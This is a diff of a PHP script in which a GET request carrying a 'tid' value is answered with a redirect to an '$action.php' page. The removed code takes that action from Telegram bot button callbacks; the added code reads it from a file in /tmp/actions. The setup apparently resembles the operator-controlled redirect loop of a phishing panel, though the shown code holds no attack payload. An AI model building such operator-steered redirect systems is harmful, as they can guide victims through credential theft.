@@ -43,35 +43,13 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 }
 
 if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['tid'])) {
-    $tid = $_GET['tid'];
+    $tid = preg_replace('/[^a-zA-Z0-9_-]/', '', $_GET['tid']);
+    $actionFile = '/tmp/actions/' . $tid . '.txt';
 
-    $res = file_get_contents("https://api.telegram.org/bot$BOT_TOKEN/getUpdates");
-    $updates = json_decode($res, true);
-
-    if (!isset($updates['result'])) {
-        echo json_encode(['ok' => false]);
-        exit;
-    }
-
-    foreach ($updates['result'] as $update) {
-        if (!isset($update['callback_query']['data'])) continue;
-        $data = $update['callback_query']['data'];
-        if (strpos($data, "$tid") !== false) {
-            $action = explode(':', $data)[0];
-
-            $msgId = $update['callback_query']['message']['message_id'];
-            $user  = $update['callback_query']['from']['username'] ?? 'Usuario';
-            $text  = $update['callback_query']['message']['caption'] ?? '';
-
-            $nuevo = $text . "\n\n✅ Acción: $action\n👤 Usuario: @$user";
-
-            curl_post("https://api.telegram.org/bot$BOT_TOKEN/editMessageCaption", [
-                'chat_id' => $CHAT_ID,
-                'message_id' => $msgId,
-                'caption' => $nuevo,
-                'parse_mode' => 'HTML'
-            ]);
-
+    if (file_exists($actionFile)) {
+        $content = trim(file_get_contents($actionFile));
+        $action  = explode('|', $content)[0] ?? '';
+        if ($action !== '') {
             echo json_encode(['ok' => true, 'redirect' => "$action.php"]);
             exit;
         }
